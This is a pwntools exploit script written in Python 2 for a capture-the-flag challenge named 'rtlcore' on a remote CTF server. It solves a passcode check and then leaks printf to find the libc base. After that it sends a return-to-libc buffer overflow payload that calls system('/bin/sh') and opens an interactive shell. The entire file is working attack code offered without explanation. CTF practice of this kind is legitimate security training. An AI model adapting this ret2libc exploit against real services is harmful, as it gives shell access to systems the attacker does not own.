from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./rtlcore")
e = ELF("./libc.so.6")
libc = ELF("./libc.so.6")
p = remote('ctf.j0n9hyun.xyz', 3015)
#gdb.attach(p, 'b*0x0804867a')
printf_offset = 0x49020
system_offset = 0x0a940
binsh_offset = 0x15902b
print p.recvuntil("Passcode: ")

payload = ''
payload += p32(0x2691f021)*4 + p32(0x2691f021 + 2)
p.sendline(payload)
print p.recvuntil("0x")
printf = int(p.recv(8), 16)
print "printf addr : ",hex(printf)

libc_base = printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search("/bin/sh").next()
print "libc_base : ", hex(libc_base)
print "system_addr : ", hex(system_addr)
print "binsh_addr : ", hex(binsh_addr)

payload = ''
payload += "A"*66
payload += p32(system_addr)
payload += "AAAA"
payload += p32(binsh_addr)

p.sendline(payload)
p.interactive()
